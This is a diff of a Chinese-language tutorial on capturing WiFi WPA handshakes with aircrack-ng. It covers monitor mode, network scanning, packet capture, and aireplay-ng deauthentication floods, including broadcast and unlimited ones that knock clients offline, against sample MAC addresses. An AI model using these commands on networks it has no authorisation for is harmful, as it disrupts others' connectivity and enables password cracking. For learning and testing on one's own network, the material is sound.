@@ -1,28 +1,25 @@
 [Aircrack-ng 官网资料](http://www.aircrack-ng.org/doku.php?id=airmon-ng)
 
-```
+```bash
 # airmon-ng 开启监听模式
-airmon-ng start wlan0
+$ airmon-ng start wlan0
 
 # airodump-ng 扫描周围 WiFi 网络
-airodump-ng wlan0mon -a
+$ airodump-ng wlan0mon -a
 
-# 04:4F:7A:8F:F3:64  28:FA:A0:68:12:E8 
+$ bssid=D4:84:09:7B:A5:7A
+$ client=84:46:93:D7:97:81
+$ ch=6
 
 # airodump-ng 开始抓包
 # airodump-ng -c {CH} --bssid {BSSID} -w {要保存握手包的目录} {无线网卡名称}
-airodump-ng -c 1 --bssid 04:4F:7A:8F:F3:64 -w ./25 wlan0mon
-
+$ airodump-ng -c $ch --bssid $bssid -w ./25 wlan0mon
 
 
 # 强制重连
 # aireplay-ng -0 {发送反认证包的个数} -a {BSSID} -c {强制下线的MAC地址(STATION下面的地址)} {无线网卡名称}
-aireplay-ng -0 10 -a 04:4F:7A:8F:F3:64 -c 28:FA:A0:68:12:E8  wlan0mon
+aireplay-ng -0 10 -a $bssid -c $client wlan0mon
 ```
-
-
-
----
 
 ## 准备
 
@@ -39,7 +36,10 @@ sudo apt install aircrack-ng
 
 - 虚拟机 vm 之类的：要购买外置的 usb 无线网卡，并安装驱动。
   [usb 无线网卡](https://blog.csdn.net/sandalphon4869/article/details/104214781)
+  
 - 双系统可以使用本机网卡，但要看看支持 aircrack-ng 吗，比如我的 Realtek 8821ce 就不支持。
+
+  【最好的方式，Kali USB Live，即插即用，可本机网卡】
 
 
 ## 原理
@@ -100,8 +100,9 @@ iwconfig
 ## 扫描网络 airodump-ng
 
 ```bash
-# 可选: -a 过滤掉隐藏bssid的station。反正不知道bssid也没法用。
-airodump-ng wlan0mon -a
+# -a 过滤掉隐藏bssid的station。反正不知道bssid也没法用。
+# --channel <channels>: 默认是2.4G，可设置5G频段来扫5G
+airodump-ng wlan0mon -a --channel 1-140
 ```
 
 ![3.png](https://cdn.jsdelivr.net/gh/sword4869/pic1@main/images/202407130814077.png)
@@ -127,7 +128,7 @@ airodump-ng wlan0mon -a
 - o/p: 开启/关闭**颜色标注**。标准有设备的无线网络AP。
 - s: 排序规则。我们选择 **sorting by power level**
 
-## 开始抓包 aireplay-ng
+### 开始抓包 airodump-ng
 
 ```bash
 # airodump-ng -c {CH} --bssid {BSSID} -w {包文件路径前缀} {无线网卡名称}
@@ -140,7 +141,7 @@ airodump-ng -c 8 --bssid 50:55:8D:C0:14:5F -w /home/kali/Desktop/cmcc wlan0mon
 23-01.cap  23-01.csv  23-01.kismet.csv  23-01.kismet.netxml  23-01.log.csv
 ```
 
-### 强制连接到 wifi 的设备重新连接路由器（可选）
+### 强制断开 aireplay-ng（可选）
 
 在抓取期间，如果有设备重新链接到这个 wifi，那么才能获取到握手包。
 
@@ -153,9 +154,11 @@ aireplay-ng -0 5 -a 5C:02:14:A4:38:50 -c 46:96:65:7D:6C:FB wlan0mon
 # 省去 -c 就是广播。
 aireplay-ng -0 5 -a 50:55:8D:C0:14:5F  wlan0mon
 
-# -0: 无限包
+# -0 0: 无限包
 aireplay-ng -0 0 -a D4:35:38:BD:4C:99 wlan0mon
 ```
+
+问题：拿自己wifi实验，都没断开成功……
 
 ### 握手成功
 
